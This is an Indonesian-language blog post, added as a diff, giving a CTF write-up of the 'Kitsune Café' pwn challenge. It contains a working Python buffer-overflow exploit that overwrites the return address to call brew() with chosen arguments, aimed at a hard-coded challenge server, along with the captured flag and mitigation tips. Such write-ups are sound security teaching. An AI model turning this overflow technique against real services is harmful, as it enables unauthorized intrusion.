@@ -1,0 +1,148 @@
+---
+title: "LappungCTF Vol 2.0 - Kitsune Café (PWN)"
+date: "2025-10-28"
+tags: ["pwn", "ctf", "writeup", "lappungctf", "kitsune"]
+summary: "Write-up Kitsune Café — ret2brew, buffer overflow sederhana yang manis seperti kopi."
+image: "/blog/LappungCTFVol2.0-KitsuneCafe/image.png"
+author: "Erwin Wijaya"
+draft: false
+featured: true
+---
+
+## Pendahuluan
+
+Halo! kali ini kita bakalan bahas challenge PWN **Kitsune Café** di LappungCTF.  
+Bayangkan sebuah kafe kecil dengan barista ramah — tapi ternyata ada *secret brew* yang cuma akan diseduh kalau kamu bisa memanipulasi programnya. Misi: dapatkan `flag.txt` dengan cara memaksa program memanggil fungsi `brew()` menggunakan buffer overflow sederhana.  
+
+Intinya: `order()` pakai `gets()` → kita overflow stack → overwrite saved return address → loncat ke `brew()` dengan menaruh argumen (pointer ke string literal) di stack. Manis, cepat, dan klasik seperti espresso shot.
+
+---
+
+## Ringkasan singkat exploit
+
+1. `order()` memakai `gets()` ke buffer lokal (`s[68]`) tanpa batas → **vulnerable**.
+2. `brew(char *s1, char *s2)` akan membuka `flag.txt` *jika* `strcmp(s1, "Foxfire Blossom")==0` **dan** `strcmp(s2, "Moonlit Ginseng")==0`.
+3. Kita menimpa saved EIP sehingga program `ret` ke `brew()`, lalu meletakkan:
+   - 4 byte dummy sebagai filler (agar argumen align setelah prolog fungsi),
+   - pointer ke `"Foxfire Blossom"`,
+   - pointer ke `"Moonlit Ginseng"`.
+4. `brew()` dieksekusi dengan argumen yang tepat → `fopen("flag.txt","r")` → isi flag dicetak.
+
+---
+
+## Detail teknis (yang saya utak‑atik)
+
+Saya buka binary dengan `strings`/`objdump` dan decompiler. Yang penting ditemukan:
+
+- Alamat fungsi `brew`: `0x08048661`
+- Alamat string `"Foxfire Blossom"`: `0x08048a20`
+- Alamat string `"Moonlit Ginseng"`: `0x08048a30`
+- Buffer di `order()` adalah 68 byte, tapi offset ke saved return (dari awal buffer) yang benar teruji adalah **76** bytes (karena saved EBP ikut tenggang).
+
+**Kenapa perlu filler (4 bytes)?**  
+Karena kita melakukan `ret` *langsung* ke alamat `brew`. Saat `brew` masuk, prolog fungsi `push ebp; mov ebp, esp` akan mendorong stack 4 byte. Agar argumen `char *s1` dan `char *s2` berada di `[ebp+8]` dan `[ebp+12]` setelah prolog, kita harus menyisipkan filler 4 byte *setelah* alamat `brew` pada payload kita. Tanpa filler, argumen bergeser dan strcmp gagal → `Recipe mismatch`.
+
+---
+
+## Payload & Layout (little-endian, 32-bit)
+
+```
+"A" * 76
+p32(0x08048661)    # overwrite saved EIP -> brew()
+p32(0x41414141)    # dummy filler (return value untuk brew)
+p32(0x08048a20)    # pointer -> "Foxfire Blossom"
+p32(0x08048a30)    # pointer -> "Moonlit Ginseng"
+```
+
+Setelah payload dikirim melalui `gets()`, `brew()` akan menerima argumen yang tepat dan mencetak flag.
+
+---
+
+## Exploit (PoC) — `solv.py`
+
+Simpan script ini lalu jalankan `python3 solv.py`.
+
+```python
+#!/usr/bin/env python3
+# solv.py — ret2brew exploit for Kitsune Café
+from struct import pack
+from time import sleep
+import socket
+
+HOST = "43.157.205.115"
+PORT = 7112
+
+BREW = 0x08048661
+FOX  = 0x08048a20
+MOON = 0x08048a30
+OFFSET = 76
+
+def p32(x): return pack("<I", x)
+
+payload  = b"A" * OFFSET
+payload += p32(BREW)         # EIP -> brew()
+payload += p32(0x41414141)   # filler -> aligns args after push ebp
+payload += p32(FOX)          # arg1 -> "Foxfire Blossom"
+payload += p32(MOON)         # arg2 -> "Moonlit Ginseng"
+payload += b"\n"
+
+def recv_all(s, timeout=0.5):
+    s.settimeout(timeout)
+    data = b""
+    try:
+        while True:
+            chunk = s.recv(4096)
+            if not chunk: break
+            data += chunk
+    except:
+        pass
+    return data
+
+with socket.create_connection((HOST, PORT), timeout=10) as s:
+    print(recv_all(s).decode(errors="ignore"))   # menu/banner
+    s.sendall(b"1\n")                            # choose Order
+    sleep(0.05)
+    print(recv_all(s).decode(errors="ignore"))   # prompt
+    s.sendall(payload)                           # send exploit
+    sleep(0.2)
+    print(recv_all(s, 1.0).decode(errors="ignore"))
+```
+
+---
+
+## Output contoh (hasil saya)
+Saat saya jalankan script di env `ctfenv`, outputnya akan seperti ini:
+
+```
+(ctfenv) Deb@Rommel:~/CaptureTheFlag/lappung/pwn/kitsune$ python3 solv.py
+=====================================
+         Welcome to Kitsune Café
+           Today's Menu
+=====================================
+1) Order — put your order
+2) Exit  — leave Kitsune Café
+=====================================
+Choose an option:
+
+[Barista]: Welcome to Kitsune Café.
+[Barista]: Our secret brew mixes the fox's flame with the moon's root.
+Please enter your order details:
+
+Order received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0
+Combining ingredients... checking recipe...
+Perfect blend! Brewing the secret brew...
+
+LappungCTF{b0f_c0ff333_ras4_cl4ss1c_ff131}
+```
+
+
+---
+
+## Mitigasi singkat
+- **Jangan gunakan `gets()`**. Gunakan `fgets()` dengan panjang buffer yang diawasi.
+- Aktifkan **Stack Canaries**, **ASLR/PIE**, dan **NX** untuk menyulitkan exploit klasik.
+- Validasi input dan kurangi penggunaan fungsi-fungsi C legacy yang tidak aman.
+
+--- 
+
+**Tags:** #lappungctf #pwn #ctf
